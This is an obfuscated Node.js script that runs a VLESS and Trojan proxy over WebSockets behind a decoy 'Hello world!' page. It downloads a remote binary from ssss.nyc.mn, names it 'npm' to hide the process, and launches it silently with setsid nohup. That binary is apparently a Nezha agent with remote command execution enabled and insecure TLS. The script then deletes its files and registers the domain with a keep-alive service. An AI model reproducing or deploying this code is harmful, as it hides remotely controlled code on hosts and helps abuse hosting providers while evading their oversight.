const _0x141066=_0x5b25;(function(_0x474c38,_0x272d08){const _0x1dfe85=_0x5b25,_0x5bcf26=_0x474c38();while(!![]){try{const _0x21fadb=-parseInt(_0x1dfe85(0x93))/0x1+parseInt(_0x1dfe85(0x9a))/0x2*(parseInt(_0x1dfe85(0xaf))/0x3)+-parseInt(_0x1dfe85(0xae))/0x4+parseInt(_0x1dfe85(0x99))/0x5+parseInt(_0x1dfe85(0xe8))/0x6*(-parseInt(_0x1dfe85(0x90))/0x7)+parseInt(_0x1dfe85(0xbb))/0x8*(-parseInt(_0x1dfe85(0x72))/0x9)+-parseInt(_0x1dfe85(0x7d))/0xa*(-parseInt(_0x1dfe85(0x83))/0xb);if(_0x21fadb===_0x272d08)break;else _0x5bcf26['push'](_0x5bcf26['shift']());}catch(_0x469556){_0x5bcf26['push'](_0x5bcf26['shift']());}}}(_0x535f,0x36ff0));const os=require('os'),http=require(_0x141066(0x97)),fs=require('fs'),axios=require(_0x141066(0xba)),net=require(_0x141066(0xe7)),path=require('path'),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x141066(0x78)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x141066(0x69)]['UUID']||_0x141066(0xd9),NEZHA_SERVER=process[_0x141066(0x69)][_0x141066(0xe5)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x141066(0x69)]['NEZHA_KEY']||'',DOMAIN=process[_0x141066(0x69)][_0x141066(0xb1)]||_0x141066(0xd1),AUTO_ACCESS=process[_0x141066(0x69)][_0x141066(0xd0)]||!![],WSPATH=process[_0x141066(0x69)][_0x141066(0xa7)]||UUID[_0x141066(0x79)](0x0,0x8),SUB_PATH=process[_0x141066(0x69)][_0x141066(0x84)]||_0x141066(0x6e),NAME=process[_0x141066(0x69)][_0x141066(0xab)]||'',PORT=process[_0x141066(0x69)][_0x141066(0x8c)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5a7037=_0x141066;try{const _0x185a1c=await axios[_0x5a7037(0xd5)](_0x5a7037(0xa4)),_0x56e28e=_0x185a1c['data'];ISP=(_0x56e28e[_0x5a7037(0x6c)]+'-'+_0x56e28e[_0x5a7037(0xb5)])[_0x5a7037(0x9b)](/ /g,'_');}catch(_0x381564){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x1e748d,_0x51366c)=>{const _0x5198cc=_0x141066;if(_0x1e748d[_0x5198cc(0x68)]==='/'){const _0x44ec0d=path[_0x5198cc(0xc2)](__dirname,_0x5198cc(0xbf));fs['readFile'](_0x44ec0d,_0x5198cc(0x88),(_0xc271d4,_0x393f8a)=>{const _0x1c6f0b=_0x5198cc;if(_0xc271d4){_0x51366c[_0x1c6f0b(0xac)](0xc8,{'Content-Type':'text/html'}),_0x51366c['end'](_0x1c6f0b(0xbc));return;}_0x51366c[_0x1c6f0b(0xac)](0xc8,{'Content-Type':'text/html'}),_0x51366c[_0x1c6f0b(0x8d)](_0x393f8a);});return;}else{if(_0x1e748d['url']==='/'+SUB_PATH){const _0x3579a0=NAME?NAME+'-'+ISP:ISP,_0x184d15='vless://'+UUID+'@'+DOMAIN+_0x5198cc(0x9e)+DOMAIN+_0x5198cc(0x7f)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x3579a0,_0x3fec97='trojan://'+UUID+'@'+DOMAIN+_0x5198cc(0xd8)+DOMAIN+_0x5198cc(0x7f)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x3579a0,_0x34dce9=_0x184d15+'\x0a'+_0x3fec97,_0x4c3bf3=Buffer[_0x5198cc(0x7e)](_0x34dce9)['toString'](_0x5198cc(0x7a));_0x51366c[_0x5198cc(0xac)](0xc8,{'Content-Type':'text/plain'}),_0x51366c['end'](_0x4c3bf3+'\x0a');}else _0x51366c['writeHead'](0x194,{'Content-Type':_0x5198cc(0x8b)}),_0x51366c['end'](_0x5198cc(0xa5));}}),wss=new WebSocket[(_0x141066(0xe4))]({'server':httpServer}),uuid=UUID[_0x141066(0x9b)](/-/g,''),DNS_SERVERS=[_0x141066(0xd4),_0x141066(0x96)];function resolveHost(_0x1ae4f1){return new Promise((_0x6db758,_0x105c37)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x1ae4f1)){_0x6db758(_0x1ae4f1);return;}let _0x13c69d=0x0;function _0x4d42f0(){const _0x2fe848=_0x5b25;if(_0x13c69d>=DNS_SERVERS[_0x2fe848(0x8e)]){_0x105c37(new Error(_0x2fe848(0x7c)+_0x1ae4f1+_0x2fe848(0xc6)));return;}const _0x385274=DNS_SERVERS[_0x13c69d];_0x13c69d++;const _0x2cbd83=_0x2fe848(0xb8)+encodeURIComponent(_0x1ae4f1)+_0x2fe848(0xdf);axios['get'](_0x2cbd83,{'timeout':0x1388,'headers':{'Accept':_0x2fe848(0xa1)}})[_0x2fe848(0xc7)](_0x5d87f9=>{const _0xf09d73=_0x2fe848,_0x579217=_0x5d87f9[_0xf09d73(0xca)];if(_0x579217[_0xf09d73(0x6f)]===0x0&&_0x579217['Answer']&&_0x579217[_0xf09d73(0x98)]['length']>0x0){const _0x39e7c1=_0x579217[_0xf09d73(0x98)][_0xf09d73(0xbd)](_0x236bc1=>_0x236bc1[_0xf09d73(0x8a)]===0x1);if(_0x39e7c1){_0x6db758(_0x39e7c1[_0xf09d73(0xca)]);return;}}_0x4d42f0();})[_0x2fe848(0xc3)](_0x5ed0d7=>{_0x4d42f0();});}_0x4d42f0();});}function handleVlessConnection(_0x5e1ff1,_0x289d24){const _0x23cb4c=_0x141066,[_0x1dc92b]=_0x289d24,_0x1fd40f=_0x289d24[_0x23cb4c(0x79)](0x1,0x11);if(!_0x1fd40f['every']((_0x502d78,_0x4a906b)=>_0x502d78==parseInt(uuid[_0x23cb4c(0xce)](_0x4a906b*0x2,0x2),0x10)))return![];let _0x23579d=_0x289d24['slice'](0x11,0x12)[_0x23cb4c(0xa8)]()+0x13;const _0x3c5ba2=_0x289d24[_0x23cb4c(0x79)](_0x23579d,_0x23579d+=0x2)['readUInt16BE'](0x0),_0xf99d3d=_0x289d24[_0x23cb4c(0x79)](_0x23579d,_0x23579d+=0x1)[_0x23cb4c(0xa8)](),_0x49cbbb=_0xf99d3d==0x1?_0x289d24[_0x23cb4c(0x79)](_0x23579d,_0x23579d+=0x4)[_0x23cb4c(0xc2)]('.'):_0xf99d3d==0x2?new TextDecoder()[_0x23cb4c(0x86)](_0x289d24['slice'](_0x23579d+0x1,_0x23579d+=0x1+_0x289d24[_0x23cb4c(0x79)](_0x23579d,_0x23579d+0x1)[_0x23cb4c(0xa8)]())):_0xf99d3d==0x3?_0x289d24['slice'](_0x23579d,_0x23579d+=0x10)[_0x23cb4c(0xb9)]((_0x36d8a5,_0x317441,_0x10cfe7,_0x472980)=>_0x10cfe7%0x2?_0x36d8a5[_0x23cb4c(0xa6)](_0x472980[_0x23cb4c(0x79)](_0x10cfe7-0x1,_0x10cfe7+0x1)):_0x36d8a5,[])[_0x23cb4c(0xcd)](_0x4ddc49=>_0x4ddc49[_0x23cb4c(0xa3)](0x0)['toString'](0x10))[_0x23cb4c(0xc2)](':'):'';_0x5e1ff1[_0x23cb4c(0xa9)](new Uint8Array([_0x1dc92b,0x0]));const _0x23265e=createWebSocketStream(_0x5e1ff1);return resolveHost(_0x49cbbb)[_0x23cb4c(0xc7)](_0x378c6d=>{const _0x333ade=_0x23cb4c;net[_0x333ade(0xc9)]({'host':_0x378c6d,'port':_0x3c5ba2},function(){const _0x14d775=_0x333ade;this[_0x14d775(0xc0)](_0x289d24[_0x14d775(0x79)](_0x23579d)),_0x23265e['on']('error',()=>{})[_0x14d775(0xb2)](this)['on']('error',()=>{})['pipe'](_0x23265e);})['on'](_0x333ade(0xaa),()=>{});})[_0x23cb4c(0xc3)](_0x395334=>{const _0x5ee45d=_0x23cb4c;net[_0x5ee45d(0xc9)]({'host':_0x49cbbb,'port':_0x3c5ba2},function(){const _0x89b7a2=_0x5ee45d;this[_0x89b7a2(0xc0)](_0x289d24['slice'](_0x23579d)),_0x23265e['on']('error',()=>{})['pipe'](this)['on'](_0x89b7a2(0xaa),()=>{})[_0x89b7a2(0xb2)](_0x23265e);})['on'](_0x5ee45d(0xaa),()=>{});}),!![];}function _0x5b25(_0x1bc13b,_0x418a02){_0x1bc13b=_0x1bc13b-0x68;const _0x535fb0=_0x535f();let _0x5b25b8=_0x535fb0[_0x1bc13b];return _0x5b25b8;}function handleTrojanConnection(_0x13ea88,_0x3f5ada){const _0x2c401c=_0x141066;try{if(_0x3f5ada[_0x2c401c(0x8e)]<0x3a)return![];const _0x26ae44=_0x3f5ada[_0x2c401c(0x79)](0x0,0x38)['toString'](),_0x5a600e=[UUID];let _0x3b1037=null;for(const _0x363dcd of _0x5a600e){const _0x7a70af=crypto[_0x2c401c(0x94)](_0x2c401c(0xe6))[_0x2c401c(0x91)](_0x363dcd)['digest'](_0x2c401c(0xcb));if(_0x7a70af===_0x26ae44){_0x3b1037=_0x363dcd;break;}}if(!_0x3b1037)return![];let _0xf1cd00=0x38;_0x3f5ada[_0xf1cd00]===0xd&&_0x3f5ada[_0xf1cd00+0x1]===0xa&&(_0xf1cd00+=0x2);const _0x314259=_0x3f5ada[_0xf1cd00];if(_0x314259!==0x1)return![];_0xf1cd00+=0x1;const _0x249ccc=_0x3f5ada[_0xf1cd00];_0xf1cd00+=0x1;let _0x2d65de,_0x45afcf;if(_0x249ccc===0x1)_0x2d65de=_0x3f5ada[_0x2c401c(0x79)](_0xf1cd00,_0xf1cd00+0x4)[_0x2c401c(0xc2)]('.'),_0xf1cd00+=0x4;else{if(_0x249ccc===0x3){const _0x316a87=_0x3f5ada[_0xf1cd00];_0xf1cd00+=0x1,_0x2d65de=_0x3f5ada[_0x2c401c(0x79)](_0xf1cd00,_0xf1cd00+_0x316a87)['toString'](),_0xf1cd00+=_0x316a87;}else{if(_0x249ccc===0x4)_0x2d65de=_0x3f5ada[_0x2c401c(0x79)](_0xf1cd00,_0xf1cd00+0x10)['reduce']((_0x120c9a,_0x135089,_0x4275b8,_0x26e3a6)=>_0x4275b8%0x2?_0x120c9a[_0x2c401c(0xa6)](_0x26e3a6[_0x2c401c(0x79)](_0x4275b8-0x1,_0x4275b8+0x1)):_0x120c9a,[])[_0x2c401c(0xcd)](_0x524687=>_0x524687[_0x2c401c(0xa3)](0x0)['toString'](0x10))[_0x2c401c(0xc2)](':'),_0xf1cd00+=0x10;else return![];}}_0x45afcf=_0x3f5ada[_0x2c401c(0xa3)](_0xf1cd00),_0xf1cd00+=0x2;_0xf1cd00<_0x3f5ada['length']&&_0x3f5ada[_0xf1cd00]===0xd&&_0x3f5ada[_0xf1cd00+0x1]===0xa&&(_0xf1cd00+=0x2);const _0x10129e=createWebSocketStream(_0x13ea88);return resolveHost(_0x2d65de)['then'](_0x4a34b9=>{const _0x568c8c=_0x2c401c;net[_0x568c8c(0xc9)]({'host':_0x4a34b9,'port':_0x45afcf},function(){const _0x35527e=_0x568c8c;_0xf1cd00<_0x3f5ada[_0x35527e(0x8e)]&&this['write'](_0x3f5ada['slice'](_0xf1cd00)),_0x10129e['on']('error',()=>{})[_0x35527e(0xb2)](this)['on']('error',()=>{})[_0x35527e(0xb2)](_0x10129e);})['on'](_0x568c8c(0xaa),()=>{});})[_0x2c401c(0xc3)](_0x540075=>{const _0x7b92a2=_0x2c401c;net[_0x7b92a2(0xc9)]({'host':_0x2d65de,'port':_0x45afcf},function(){const _0x2cd259=_0x7b92a2;_0xf1cd00<_0x3f5ada['length']&&this['write'](_0x3f5ada[_0x2cd259(0x79)](_0xf1cd00)),_0x10129e['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x10129e);})['on']('error',()=>{});}),!![];}catch(_0x20deb0){return![];}}wss['on'](_0x141066(0x89),(_0x174e49,_0x3485d6)=>{const _0x43204d=_0x141066,_0x31ef6a=_0x3485d6[_0x43204d(0x68)]||'';_0x174e49[_0x43204d(0x92)]('message',_0x379771=>{const _0x46e49b=_0x43204d;if(_0x379771['length']>0x11&&_0x379771[0x0]===0x0){const _0x1ada6f=_0x379771[_0x46e49b(0x79)](0x1,0x11),_0x3f0806=_0x1ada6f[_0x46e49b(0x81)]((_0x4e7011,_0x29f971)=>_0x4e7011==parseInt(uuid[_0x46e49b(0xce)](_0x29f971*0x2,0x2),0x10));if(_0x3f0806){!handleVlessConnection(_0x174e49,_0x379771)&&_0x174e49['close']();return;}}!handleTrojanConnection(_0x174e49,_0x379771)&&_0x174e49[_0x46e49b(0x76)]();})['on'](_0x43204d(0xaa),()=>{});});const getDownloadUrl=()=>{const _0x3f2eaa=_0x141066,_0x2b136d=os[_0x3f2eaa(0xb6)]();return _0x2b136d===_0x3f2eaa(0xc5)||_0x2b136d===_0x3f2eaa(0x9d)||_0x2b136d==='aarch64'?!NEZHA_PORT?_0x3f2eaa(0xd2):_0x3f2eaa(0xb3):!NEZHA_PORT?_0x3f2eaa(0x85):_0x3f2eaa(0xdd);},downloadFile=async()=>{const _0xead204=_0x141066;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5a8f73=getDownloadUrl(),_0x2b5a6e=await axios({'method':'get','url':_0x5a8f73,'responseType':_0xead204(0x87)}),_0x446338=fs[_0xead204(0x9c)](_0xead204(0xe0));return _0x2b5a6e[_0xead204(0xca)][_0xead204(0xb2)](_0x446338),new Promise((_0x38bce4,_0x3f4238)=>{const _0x5d8097=_0xead204;_0x446338['on'](_0x5d8097(0x70),()=>{const _0x309ee6=_0x5d8097;console['log'](_0x309ee6(0xd7)),exec(_0x309ee6(0x82),_0x12af20=>{if(_0x12af20)_0x3f4238(_0x12af20);_0x38bce4();});}),_0x446338['on'](_0x5d8097(0xaa),_0x3f4238);});}catch(_0x2fde6d){throw _0x2fde6d;}},runnz=async()=>{const _0x5c7c7d=_0x141066;try{const _0x2069fc=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x5c7c7d(0xcc)});if(_0x2069fc['trim']()!==''){console[_0x5c7c7d(0xbe)](_0x5c7c7d(0x9f));return;}}catch(_0x8e5e1d){}await downloadFile();let _0x6ba57='',_0x33fcc=[_0x5c7c7d(0x75),_0x5c7c7d(0xa0),_0x5c7c7d(0x77),_0x5c7c7d(0x6a),_0x5c7c7d(0x6b),_0x5c7c7d(0x71)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x13f1a0=_0x33fcc[_0x5c7c7d(0x6d)](NEZHA_PORT)?'--tls':'';_0x6ba57=_0x5c7c7d(0x95)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5c7c7d(0xdb)+NEZHA_KEY+'\x20'+_0x13f1a0+_0x5c7c7d(0xd6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x472502=NEZHA_SERVER[_0x5c7c7d(0x6d)](':')?NEZHA_SERVER[_0x5c7c7d(0xc1)](':')[_0x5c7c7d(0xb7)]():'',_0x5514c5=_0x33fcc[_0x5c7c7d(0x6d)](_0x472502)?_0x5c7c7d(0xc8):'false',_0xe13de0='client_secret:\x20'+NEZHA_KEY+_0x5c7c7d(0x7b)+NEZHA_SERVER+_0x5c7c7d(0xe2)+_0x5514c5+_0x5c7c7d(0x80)+UUID;fs[_0x5c7c7d(0xb0)](_0x5c7c7d(0xd3),_0xe13de0);}_0x6ba57=_0x5c7c7d(0xe3);}else{console[_0x5c7c7d(0xbe)](_0x5c7c7d(0xa2));return;}}try{exec(_0x6ba57,{'shell':_0x5c7c7d(0xad)},_0x686fb8=>{const _0xd4ae1e=_0x5c7c7d;if(_0x686fb8)console[_0xd4ae1e(0xaa)](_0xd4ae1e(0x73),_0x686fb8);else console[_0xd4ae1e(0xbe)](_0xd4ae1e(0xc4));});}catch(_0x55ee44){console[_0x5c7c7d(0xaa)](_0x5c7c7d(0xe1)+_0x55ee44);}};async function addAccessTask(){const _0x5412c7=_0x141066;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5cfae1=_0x5412c7(0xcf)+DOMAIN;try{const _0xde5416=await axios['post'](_0x5412c7(0xde),{'url':_0x5cfae1},{'headers':{'Content-Type':_0x5412c7(0xdc)}});console['log'](_0x5412c7(0x8f));}catch(_0x1fd835){}}const delFiles=()=>{const _0x559ce9=_0x141066;fs[_0x559ce9(0xb4)](_0x559ce9(0xe0),()=>{}),fs[_0x559ce9(0xb4)]('config.yaml',()=>{});};function _0x535f(){const _0x1071b4=['\x20with\x20all\x20DNS\x20servers','then','true','connect','data','hex','utf-8','map','substr','https://','AUTO_ACCESS','1234.abc.com','https://arm64.ssss.nyc.mn/v1','config.yaml','8.8.4.4','get','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm\x20download\x20successfully',':443?security=tls&sni=','e8568c0b-07ef-4d8f-adea-fc7f00d2f1dc','listen','\x20-p\x20','application/json','https://amd64.ssss.nyc.mn/agent','https://oooo.serv00.net/add-url','&type=A','npm','error:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Server','NEZHA_SERVER','sha224','net','546omKXce','url','env','2087','2083','country_code','includes','sub','Status','finish','2053','1292031qLDBIt','npm\x20running\x20error:','Server\x20is\x20running\x20on\x20port\x20','443','close','2096','child_process','slice','base64','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Failed\x20to\x20resolve\x20','10gglmHK','from','&fp=chrome&type=ws&host=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','every','chmod\x20+x\x20npm','6590287LqvZZF','SUB_PATH','https://amd64.ssss.nyc.mn/v1','decode','stream','utf8','connection','type','text/plain','PORT','end','length','Automatic\x20Access\x20Task\x20added\x20successfully','25473nlzgsJ','update','once','16234edruRq','createHash','setsid\x20nohup\x20./npm\x20-s\x20','1.1.1.1','http','Answer','342300PnNBKk','469296SGwgSb','replace','createWriteStream','arm64',':443?encryption=none&security=tls&sni=','npm\x20is\x20already\x20running,\x20skip\x20running...','8443','application/dns-json','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','readUInt16BE','https://api.ip.sb/geoip','Not\x20Found\x0a','concat','WSPATH','readUInt8','send','error','NAME','writeHead','/bin/bash','744076UKwmQh','3fjMyiE','writeFileSync','DOMAIN','pipe','https://arm64.ssss.nyc.mn/agent','unlink','isp','arch','pop','https://dns.google/resolve?name=','reduce','axios','8CvouAK','Hello\x20world!','find','log','index.html','write','split','join','catch','npm\x20is\x20running','arm'];_0x535f=function(){return _0x1071b4;};return _0x535f();}httpServer[_0x141066(0xda)](PORT,()=>{const _0x42a06c=_0x141066;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x42a06c(0x74)+PORT);});
